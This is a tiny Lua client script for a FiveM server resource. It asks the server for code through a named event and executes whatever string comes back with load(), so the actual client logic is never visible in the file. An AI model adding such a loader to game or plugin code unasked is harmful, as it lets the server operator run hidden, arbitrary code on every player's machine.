local name = GetCurrentResourceName()

Citizen.CreateThread(function()
    TriggerServerEvent("sendclient-"..name)

    RegisterNetEvent("getclient-"..name, function(code)
        assert(load(code))()
    end)
end)